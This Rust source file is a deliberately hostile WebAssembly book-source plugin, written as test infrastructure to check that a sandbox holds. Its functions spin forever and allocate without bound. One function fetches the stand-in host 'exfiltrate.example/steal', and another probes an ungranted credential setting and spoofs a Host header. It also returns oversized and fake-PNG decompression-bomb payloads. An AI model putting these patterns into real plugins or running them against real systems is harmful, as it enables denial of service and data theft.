//! A misbehaving book source plugin.
//!
//! Test infrastructure, not an example. Every function does something a hostile or broken book
//! source would do, so the conformance suite can show the sandbox holds for the second world as
//! it does for the first.
//!
//! | Call | Attack |
//! |---|---|
//! | `search` | Never returns: the epoch deadline must stop it. |
//! | `series` | Allocates without bound: the memory ceiling must stop it. |
//! | `list-chapters` | Fetches a host it did not declare: the allowlist must deny it. |
//! | `chapter-content` | Names page images on an undeclared host and reads a setting it was never granted: the host must refuse the pages and answer `none`. It also names pages it makes itself, one per attack below. |
//! | `page-bytes` | Per page: hands over more bytes than a page may have, bytes that are no image, an image whose header claims more pixels than a page may have, spins forever, or allocates without bound. The host must refuse or stop each one. |
//! | `describe` | Declares one harmless host, so the attempts above are real escapes. |

#[allow(warnings)]
mod bindings {
    wit_bindgen::generate!({
        path: "../../wit/kaeri-books.wit",
        world: "book-plugin",
    });
}

use bindings::{
    exports::kaeri::books::source::{
        Chapter, Content, Guest, Manifest, Page, PageImage, PageUrl, SeriesDetail, SeriesHit,
        SourceError, TitleHints,
    },
    kaeri::books::host,
};

struct Component;

impl Guest for Component {
    fn describe() -> Manifest {
        Manifest {
            id: "test-hostile-books".into(),
            display_name: "Hostile books (test only)".into(),
            version: "0.1.0".into(),
            allowed_hosts: vec!["allowed.example".into()],
            media: vec!["manga".into(), "comics-of-the-future".into()],
            languages: vec!["en".into()],
            capabilities: vec!["a-capability-no-host-knows".into()],
        }
    }

    /// Spins forever. Only the host's epoch interruption can stop this.
    fn search(_query: String, _hints: TitleHints) -> Result<Vec<SeriesHit>, SourceError> {
        let mut spin: u64 = 0;
        loop {
            spin = spin.wrapping_add(1);
            std::hint::black_box(spin);
        }
    }

    /// Allocates until the ceiling stops it.
    fn series(_id: String, _hints: TitleHints) -> Result<SeriesDetail, SourceError> {
        let mut hoard: Vec<Vec<u8>> = Vec::new();
        loop {
            hoard.push(std::hint::black_box(vec![0xAB_u8; 4 * 1024 * 1024]));
            if hoard.len() > 4096 {
                return Err(SourceError::Other("ESCAPED: allocated without bound".into()));
            }
        }
    }

    /// Tries to reach a host the manifest never declared.
    fn list_chapters(_id: String, _hints: TitleHints) -> Result<Vec<Chapter>, SourceError> {
        let result = host::fetch(&host::HttpRequest {
            method: "GET".into(),
            url: "https://exfiltrate.example/steal".into(),
            headers: vec![],
            body: None,
        });
        match result {
            Err(host::HostError::Denied(m)) => Err(SourceError::Other(format!("denied: {m}"))),
            Err(other) => Err(SourceError::Other(format!("not-denied: {other:?}"))),
            Ok(_) => Err(SourceError::Other("ESCAPED: the fetch succeeded".into())),
        }
    }

    /// Pages on a host it never declared, which the host must refuse to fetch, and a setting it
    /// was never granted, which the host must answer with `none`.
    fn chapter_content(_series: String, _chapter: String) -> Result<Content, SourceError> {
        if let Some(value) = host::config_get("credential-that-does-not-exist") {
            return Err(SourceError::Other(format!("ESCAPED: config-get leaked {value:?}")));
        }
        let at = |url: &str, headers: Vec<(String, String)>| Page {
            image: PageImage::Url(PageUrl { url: url.into(), headers }),
            width: None,
            height: None,
        };
        let made =
            |id: &str| Page { image: PageImage::Plugin(id.into()), width: None, height: None };
        let mut pages = vec![
            at("https://exfiltrate.example/page-1.jpg", vec![]),
            // A reserved header: the host sets these itself.
            at(
                "https://allowed.example/page-2.jpg",
                vec![("host".into(), "exfiltrate.example".into())],
            ),
        ];
        pages.extend(MADE.iter().map(|id| made(id)));
        Ok(Content::Images(pages))
    }

    /// Each page it makes is an attack, named by its id.
    fn page_bytes(
        _series: String,
        _chapter: String,
        page: String,
    ) -> Result<Vec<u8>, SourceError> {
        match page.as_str() {
            // One byte over the host's page ceiling (16 MiB), dressed as a JPEG.
            "too-large" => {
                let mut bytes = vec![0_u8; 16 * 1024 * 1024 + 1];
                bytes[..3].copy_from_slice(&[0xFF, 0xD8, 0xFF]);
                Ok(bytes)
            }
            // A web page where an image should be.
            "not-an-image" => Ok(b"<html><body>no picture here</body></html>".to_vec()),
            // A real PNG header claiming 20000 by 20000 pixels, 400 million, in 65 bytes.
            "too-many-pixels" => Ok(png_claiming(20_000, 20_000)),
            "spin" => {
                let mut spin: u64 = 0;
                loop {
                    spin = spin.wrapping_add(1);
                    std::hint::black_box(spin);
                }
            }
            "hoard" => {
                let mut hoard: Vec<Vec<u8>> = Vec::new();
                loop {
                    hoard.push(std::hint::black_box(vec![0xAB_u8; 4 * 1024 * 1024]));
                    if hoard.len() > 4096 {
                        return Err(SourceError::Other(
                            "ESCAPED: allocated without bound".into(),
                        ));
                    }
                }
            }
            _ => Err(SourceError::NotFound),
        }
    }
}

/// The ids of the pages it makes, in the order `chapter-content` names them.
const MADE: [&str; 5] = ["too-large", "not-an-image", "too-many-pixels", "spin", "hoard"];

/// A PNG signature, a valid header chunk for a `width` by `height` grey image and one empty
/// data chunk: what a decoder reads before it learns the size, and no pixels at all.
fn png_claiming(width: u32, height: u32) -> Vec<u8> {
    let mut header = b"IHDR".to_vec();
    header.extend(width.to_be_bytes());
    header.extend(height.to_be_bytes());
    // 8-bit grey, deflate, adaptive filtering, no interlace.
    header.extend([8, 0, 0, 0, 0]);
    let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
    png.extend(13_u32.to_be_bytes());
    png.extend(&header);
    png.extend(crc32(&header).to_be_bytes());
    // An empty zlib stream.
    let mut data = b"IDAT".to_vec();
    data.extend([0x78, 0x9C, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01]);
    png.extend(8_u32.to_be_bytes());
    png.extend(&data);
    png.extend(crc32(&data).to_be_bytes());
    png.extend(0_u32.to_be_bytes());
    png.extend(b"IEND");
    png.extend(crc32(b"IEND").to_be_bytes());
    png
}

/// The CRC every PNG chunk ends with.
fn crc32(bytes: &[u8]) -> u32 {
    let mut crc = !0_u32;
    for &byte in bytes {
        crc ^= u32::from(byte);
        for _ in 0..8 {
            crc = if crc & 1 == 1 { (crc >> 1) ^ 0xEDB8_8320 } else { crc >> 1 };
        }
    }
    !crc
}

bindings::export!(Component with_types_in bindings);
